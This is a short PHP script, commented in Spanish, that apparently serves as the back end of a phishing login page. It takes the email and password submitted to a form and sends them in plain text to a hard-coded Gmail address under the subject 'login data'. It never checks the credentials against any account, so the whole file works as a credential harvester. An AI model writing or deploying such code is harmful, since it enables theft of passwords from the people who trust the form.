<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir los datos del formulario
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Configuración del correo
    $destinatario = "biomedicdental@gmail.com";
    $asunto = "Datos de inicio de sesión";
    $mensaje = "Correo electrónico: $email\nContraseña: $password";

    // Cabeceras del correo
    $cabeceras = "From: no-reply@tudominio.com\r\n";
    $cabeceras .= "Reply-To: no-reply@tudominio.com\r\n";
    $cabeceras .= "Content-type: text/plain; charset=UTF-8\r\n";

    // Enviar el correo
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        echo "Los datos se han enviado correctamente.";
    } else {
        echo "Hubo un error al enviar los datos.";
    }
} else {
    echo "Método de solicitud no permitido.";
}
?>